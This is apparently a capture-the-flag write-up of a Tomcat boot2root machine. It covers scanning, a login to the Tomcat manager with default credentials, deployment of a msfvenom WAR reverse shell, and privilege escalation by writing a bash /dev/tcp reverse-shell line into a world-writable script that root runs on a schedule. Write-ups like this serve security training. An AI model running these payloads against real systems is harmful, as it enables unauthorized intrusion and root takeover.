## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
boot2root machine for FIT and bsides guatemala CTF
read user.txt and root.txt
```

##  IP-Address
```IP-Address
10.201.54.20
```

## RustScan 
```bash
$ rustscan -a 10.201.54.20 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
===============================================================
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 60
8009/tcp open  ajp13      syn-ack ttl 60
8080/tcp open  http-proxy syn-ack ttl 60
===============================================================
```

## Gobuster
```bash
$ gobuster dir -u http://10.201.54.20:8080  -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 4 -x php,txt,bake
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
===============================================================
```

When trying multiple times found information 
```Information
<role rolename="admin-gui"/> <Default_credentials>
<user username="tomcat" password="[password omitted]" roles="admin-gui"/>
Note that for Tomcat 7 onwards, the roles required to use the host manager application were changed from the single admin role to the following two roles. You will need to assign the role(s) required for the functionality you wish to access.
```
And when tried to login on `/host-manager/html` its show nothing negative but on other side `/manager/html` it actually works and got inside the dashboard where we found file upload option
Then WE created a `.war` reverse-shell File to upload on tomcat 
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.17.36.74 LPORT=4444 -f war -o shell.war
```
After uploading on the Tomcat we deployed it and then Clicked on the new session shell and got the shell
```bash
$ nc -lvnp 4444
connect to [10.17.36.74] from (UNKNOWN) [10.201.54.20] 59666
cd /home
ls
jack
cd jack
ls
id.sh
test.txt
user.txt
cat id.sh
#!/bin/bash
id > test.txt
cat test.sh
cat test.txt
uid=0(root) gid=0(root) groups=0(root)
cat user.txt
[flag/hash omitted]
```

## User Flag
```Flag
[flag/hash omitted]
```

As Expected we got more files in the /home/jack 
```Files
id.sh
test.txt
user.txt
cat id.sh
#!/bin/bash
id > test.txt
```
which definitely tells about that the id.sh runs as root and it is writable by worldwide so we can write our own reverse-shell here and got the root shell and then can actually create an `SSH` id in the system
```bash
echo 'bash -i >& /dev/tcp/10.17.36.74/4445 0>&1' > /home/jack/id.sh 
chmod +x /home/jack/id.sh
```
inject the reverse-shell code & run 
```bash
cat id.sh
```
and let he cronjob runs &
Got the Reverse-Shell as root 
```bash
─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.17.36.74] from (UNKNOWN) [10.201.54.20] 43152
bash: cannot set terminal process group (1498): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# whoami
whoami
root
root@ubuntu:/home/jack# cat /root/root.txt
cat /root/root.txt
[flag/hash omitted]
root@ubuntu:/home/jack# 
```

## Root Flag
```Flag
[flag/hash omitted]
```